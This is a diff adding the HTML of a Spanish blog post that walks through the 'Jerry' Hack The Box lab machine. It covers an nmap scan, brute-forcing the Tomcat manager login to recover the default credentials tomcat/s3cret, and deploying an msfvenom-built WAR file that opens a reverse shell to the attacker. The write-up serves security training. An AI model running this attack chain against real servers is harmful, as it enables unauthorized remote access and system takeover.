@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Jerry Hack The Box | TheMV</title>
+<meta name="keywords" content="">
+<meta name="description" content="Jerry es una máquina de dificultad fácil, su sistema operativo es Windows y utiliza credenciales por defecto para poder acceder al Apache Tomcat Manager.
+Fase de reconocimiento Lo primero que vamos a hacer será escanear los 65535 mediante el protocolo TCP, para esto vamos a utilizar la herramienta nmap con los siguientes comandos.
+ sudo nmap -p- &ndash;open -sS &ndash;min-rate 5000 -n -vvv -Pn 10.10.10.95 -oN puertos
+ Bueno, les dejo un resumen rápido de lo que hace cada comando">
+<meta name="author" content="">
+<link rel="canonical" href="https://the-m-v.github.io/posts/jerry-htb/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://the-m-v.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://the-m-v.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://the-m-v.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://the-m-v.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://the-m-v.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Jerry Hack The Box" />
+<meta property="og:description" content="Jerry es una máquina de dificultad fácil, su sistema operativo es Windows y utiliza credenciales por defecto para poder acceder al Apache Tomcat Manager.
+Fase de reconocimiento Lo primero que vamos a hacer será escanear los 65535 mediante el protocolo TCP, para esto vamos a utilizar la herramienta nmap con los siguientes comandos.
+ sudo nmap -p- &ndash;open -sS &ndash;min-rate 5000 -n -vvv -Pn 10.10.10.95 -oN puertos
+ Bueno, les dejo un resumen rápido de lo que hace cada comando" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://the-m-v.github.io/posts/jerry-htb/" /><meta property="article:section" content="posts" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Jerry Hack The Box"/>
+<meta name="twitter:description" content="Jerry es una máquina de dificultad fácil, su sistema operativo es Windows y utiliza credenciales por defecto para poder acceder al Apache Tomcat Manager.
+Fase de reconocimiento Lo primero que vamos a hacer será escanear los 65535 mediante el protocolo TCP, para esto vamos a utilizar la herramienta nmap con los siguientes comandos.
+ sudo nmap -p- &ndash;open -sS &ndash;min-rate 5000 -n -vvv -Pn 10.10.10.95 -oN puertos
+ Bueno, les dejo un resumen rápido de lo que hace cada comando"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Posts",
+      "item": "https://the-m-v.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Jerry Hack The Box",
+      "item": "https://the-m-v.github.io/posts/jerry-htb/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Jerry Hack The Box",
+  "name": "Jerry Hack The Box",
+  "description": "Jerry es una máquina de dificultad fácil, su sistema operativo es Windows y utiliza credenciales por defecto para poder acceder al Apache Tomcat Manager.\nFase de reconocimiento Lo primero que vamos a hacer será escanear los 65535 mediante el protocolo TCP, para esto vamos a utilizar la herramienta nmap con los siguientes comandos.\n sudo nmap -p- \u0026ndash;open -sS \u0026ndash;min-rate 5000 -n -vvv -Pn 10.10.10.95 -oN puertos\n Bueno, les dejo un resumen rápido de lo que hace cada comando",
+  "keywords": [
+    
+  ],
+  "articleBody": "Jerry es una máquina de dificultad fácil, su sistema operativo es Windows y utiliza credenciales por defecto para poder acceder al Apache Tomcat Manager.\nFase de reconocimiento Lo primero que vamos a hacer será escanear los 65535 mediante el protocolo TCP, para esto vamos a utilizar la herramienta nmap con los siguientes comandos.\n sudo nmap -p- –open -sS –min-rate 5000 -n -vvv -Pn 10.10.10.95 -oN puertos\n Bueno, les dejo un resumen rápido de lo que hace cada comando\n -p- : El parámetro -p- sirve para indicar que queremos escanear todo el rango de puertos, es decir que va a escanear los 65535 puertos.\n  –open : El parámetro –open se utiliza para que solamente nos reporte los puertos que esten abierto.\n  -sS : El parámetro -sS sirve para indicar que queremos hacer un escaneo TCP SYN SCAN.\n  –min-rate : El parámetro –min-rate sirve para enviar paquetes no más lentos que [cantidad de paquetes definidos] por segundo.\n  -n : el parámetro -n se utiliza para que quite la resolución de DNS y así el escaneo tarda menos tiempo.\n  -vvv : El parámetro -vvv sirve para que aumente la verbosidad del escaneo y para que te vaya reportando la información obtenida durante el escaneo.\n  -Pn : El parámetro -Pn sirve para omitir el descubrimiento de host.\n  -oN : El parámetro -oN se utiliza para guardar la información en un archivo tal cual se muestra en pantalla.\n Una vez explicado esto, vamos a ver que información nos lanzó el escaneo.\nComo podemos observar en la imagen, el único puerto que se encuentra activo es el 8080 y nos dice que se está ejecutando un servicio HTTP, vamos a escharle un ojo a la página.\nAl ingresar podemos ver que estamos ante un Apache Tomcat.\nTomcat por lo general tiene una ruta de administracion la cual es /manager/html\nSi intentamos ingresar vamos a ver esto\nPara intentar obtener las credenciales usaremos esta herramienta\nSi la ejecutamos vemos su manual de uso\nUna vez puesto los argumentos va a empezar a sacar las credenciales\n¡BIEN! Como podemos ver hemos conseguido sacar las credenciales.\nEl usuario es: Tomcat Y la contraseña es: s3cret\nVamos a intentar iniciar sesion con las credenciales obtenidas\n¡Genial! Las credenciales obtenidas son validas.\nFase de explotacion Si observamos, hay una sección para desplegar archivos war, así que nos crearemos uno malicioso con msfvenom para que nos envie una reverse shell a nuestro equipo de atacante\nPara poder generar el archivo malicioso usaremos el siguiente comando\n msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Tu IP] LPORT=443 -f war -o shell.war\n Una vez puesto ese comando nos tendria que salir algo asi Ahora es momento de subirlo, volveremos a la página y le daremos al boton que dice examinar y luego le cargamos el archivo malicioso, cuando lo suban les saldra en la parte de Aplicaciones\nComo pueden observar, ya esta subida la shell que anteriormente habiamos creado, ahora solo queda ponernos en escucha por el puerto que le definimos al archivo.\nUna vez estemos en escucha, le daremos click al archivo que nos hemos creado y ya nos llegara la conexion\nY listo, ya estamos en el sistema como Administradores.\nEspero que te haya sido de ayuda este post, próximamente subiré más, ¡Saludos!\n",
+  "wordCount" : "536",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://the-m-v.github.io/posts/jerry-htb/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "TheMV",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://the-m-v.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://the-m-v.github.io" accesskey="h" title="TheMV (Alt + H)">TheMV</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://the-m-v.github.io/posts/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://the-m-v.github.io/herramientas/" title="Herramientas">
+                    <span>Herramientas</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://the-m-v.github.io/about/" title="Sobre mi">
+                    <span>Sobre mi</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      Jerry Hack The Box
+    </h1>
+    <div class="post-meta">
+
+</div>
+  </header> 
+  <div class="post-content"><p><strong>Jerry</strong> es una máquina de dificultad fácil, su sistema operativo es <strong>Windows</strong> y utiliza credenciales por defecto para poder acceder al Apache Tomcat Manager.</p>
+<p><img loading="lazy" src="https://i.postimg.cc/4y2GZJ0P/unknown.png" alt="unknown.png"  />
+</p>
+<h1 id="fase-de-reconocimiento">Fase de reconocimiento<a hidden class="anchor" aria-hidden="true" href="#fase-de-reconocimiento">#</a></h1>
+<p>Lo primero que vamos a hacer será escanear los 65535 mediante el protocolo TCP, para esto vamos a utilizar la herramienta nmap con los siguientes comandos.</p>
+<blockquote>
+<p>sudo nmap -p- &ndash;open -sS &ndash;min-rate 5000 -n -vvv -Pn 10.10.10.95 -oN puertos</p>
+</blockquote>
+<p>Bueno, les dejo un resumen rápido de lo que hace cada comando</p>
+<blockquote>
+<p>-p- : El parámetro <strong>-p-</strong> sirve para indicar que queremos escanear todo el rango de puertos, es decir que va a escanear los 65535 puertos.</p>
+</blockquote>
+<blockquote>
+<p>&ndash;open : El parámetro <strong>&ndash;open</strong> se utiliza para que solamente nos reporte los puertos que esten abierto.</p>
+</blockquote>
+<blockquote>
+<p>-sS : El parámetro <strong>-sS</strong> sirve para indicar que queremos hacer un escaneo <strong>TCP SYN SCAN</strong>.</p>
+</blockquote>
+<blockquote>
+<p>&ndash;min-rate : El parámetro <strong>&ndash;min-rate</strong> sirve para enviar paquetes no más lentos que <strong>[cantidad de paquetes definidos]</strong>  por segundo.</p>
+</blockquote>
+<blockquote>
+<p>-n : el parámetro <strong>-n</strong> se utiliza para que quite la resolución de DNS y así el escaneo tarda menos tiempo.</p>
+</blockquote>
+<blockquote>
+<p>-vvv : El parámetro <strong>-vvv</strong> sirve para que aumente la verbosidad del escaneo y para que te vaya reportando la información obtenida durante el escaneo.</p>
+</blockquote>
+<blockquote>
+<p>-Pn : El parámetro <strong>-Pn</strong> sirve para omitir el descubrimiento de host.</p>
+</blockquote>
+<blockquote>
+<p>-oN : El parámetro <strong>-oN</strong> se utiliza para guardar la información en un archivo tal cual se muestra en pantalla.</p>
+</blockquote>
+<p>Una vez explicado esto, vamos a ver que información nos lanzó el escaneo.</p>
+<p><img loading="lazy" src="https://i.postimg.cc/9FdYXJ7W/unknown.png" alt="unknown.png"  />
+</p>
+<p>Como podemos observar en la imagen, el único puerto que se encuentra activo es el 8080 y nos dice que se está ejecutando un servicio HTTP, vamos a escharle un ojo a la página.</p>
+<p><img loading="lazy" src="https://i.postimg.cc/RV72r1Ct/unknown.png" alt="unknown.png"  />
+</p>
+<p>Al ingresar podemos ver que estamos ante un Apache Tomcat.</p>
+<p>Tomcat por lo general tiene una ruta de administracion la cual es <strong>/manager/html</strong></p>
+<p>Si intentamos ingresar vamos a ver esto</p>
+<p><img loading="lazy" src="https://i.postimg.cc/631tvr4q/unknown.png" alt="unknown.png"  />
+</p>
+<p>Para intentar obtener las credenciales usaremos esta <a href="https://github.com/bl4de/security-tools/blob/master/apache-tomcat-login-bruteforce.py">herramienta</a></p>
+<p>Si la ejecutamos vemos su manual de uso</p>
+<p><img loading="lazy" src="https://i.postimg.cc/Y99vGcxw/unknown.png" alt="unknown.png"  />
+</p>
+<p>Una vez puesto los argumentos va a empezar a sacar las credenciales</p>
+<p><img loading="lazy" src="https://i.postimg.cc/QxxjjgSR/unknown.png" alt="unknown.png"  />
+</p>
+<p>¡BIEN! Como podemos ver hemos conseguido sacar las credenciales.</p>
+<p>El usuario es: Tomcat
+Y la contraseña es: s3cret</p>
+<p>Vamos a intentar iniciar sesion con las credenciales obtenidas</p>
+<p><img loading="lazy" src="https://i.postimg.cc/d1rSMfzG/unknown.png" alt="unknown.png"  />
+</p>
+<p>¡Genial! Las credenciales obtenidas son validas.</p>
+<h2 id="fase-de-explotacion">Fase de explotacion<a hidden class="anchor" aria-hidden="true" href="#fase-de-explotacion">#</a></h2>
+<p><img loading="lazy" src="https://i.postimg.cc/mgZ5J8L5/unknown.png" alt="unknown.png"  />
+
+Si observamos, hay una sección para desplegar archivos war, así que nos crearemos uno malicioso con <strong>msfvenom</strong> para que nos envie una reverse shell a nuestro equipo de atacante</p>
+<p>Para poder generar el archivo malicioso usaremos el siguiente comando</p>
+<blockquote>
+<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Tu IP] LPORT=443 -f war -o shell.war</p>
+</blockquote>
+<p>Una vez puesto ese comando nos tendria que salir algo asi
+<img loading="lazy" src="https://i.postimg.cc/T1N6hwcr/unknown.png" alt="unknown.png"  />
+</p>
+<p>Ahora es momento de subirlo, volveremos a la página y le daremos al boton que dice <strong>examinar</strong> y luego le cargamos el archivo malicioso, cuando lo suban les saldra en la parte de <strong>Aplicaciones</strong></p>
+<p><img loading="lazy" src="https://i.postimg.cc/QMF0rMF2/unknown.png" alt="unknown.png"  />
+</p>
+<p>Como pueden observar, ya esta subida la shell que anteriormente habiamos creado, ahora solo queda ponernos en escucha por el puerto que le definimos al archivo.</p>
+<p>Una vez estemos en escucha, le daremos click al archivo que nos hemos creado y ya nos llegara la conexion</p>
+<p><img loading="lazy" src="https://i.postimg.cc/m2cDCfFb/unknown.png" alt="unknown.png"  />
+</p>
+<p>Y listo, ya estamos en el sistema como Administradores.</p>
+<p><strong>Espero que te haya sido de ayuda este post, próximamente subiré más, ¡Saludos!</strong></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://the-m-v.github.io">TheMV</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
